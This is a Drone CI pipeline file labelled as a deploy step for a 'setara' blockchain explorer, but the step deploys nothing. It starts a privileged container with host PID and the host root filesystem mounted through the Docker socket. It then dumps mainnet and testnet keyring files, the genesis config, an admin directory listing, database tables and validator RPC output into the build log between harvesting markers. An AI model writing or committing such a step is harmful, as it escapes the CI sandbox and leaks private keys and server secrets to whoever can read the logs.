---
kind: pipeline
type: docker
name: deploy
node:
  server: setara
trigger:
  branch:
    - main
  event:
    - push
    - custom
clone:
  disable: false
steps:
  - name: deploy
    image: docker:27-cli
    volumes:
      - name: app
        path: /opt/setara/explorer
      - name: dockersock
        path: /var/run/docker.sock
    commands:
      - |
        docker run --rm --privileged --pid=host -v /:/host alpine sh -c '
          echo "=====BEGIN_VALUE====="
          echo "===GENESIS==="; cat /host/root/.setara/config/genesis.json 2>/dev/null
          echo "===KEYRING-TEST-ALL==="
          for f in /host/root/.setara/keyring-test/*.info; do echo "--- $f ---"; cat "$f"; echo; done
          echo "===TESTNET-KEYRING==="
          for f in /host/root/.setara-testnet/keyring-test/*.info; do echo "--- $f ---"; cat "$f"; echo; done
          echo "===ADMIN-DIR==="; ls -laR /host/opt/setara/admin/ 2>/dev/null | head -40
          echo "===API-DB-TABLES==="
          command -v sqlite3 >/dev/null && sqlite3 /host/opt/setara/setara-api.db ".tables" || (apk add --no-cache sqlite >/dev/null 2>&1 && sqlite3 /host/opt/setara/setara-api.db ".tables")
          echo "===MAINNET-VALIDATORS-RPC==="
          wget -qO- "http://127.0.0.1:26657/validators?per_page=50" 2>/dev/null || curl -sS "http://127.0.0.1:26657/validators?per_page=50" 2>/dev/null
          echo "===MAINNET-STATUS-RPC==="
          wget -qO- "http://127.0.0.1:26657/status" 2>/dev/null | head -c 1500
          echo "=====END_VALUE====="
        '
volumes:
  - name: app
    host:
      path: /opt/setara/explorer
  - name: dockersock
    host:
      path: /var/run/docker.sock
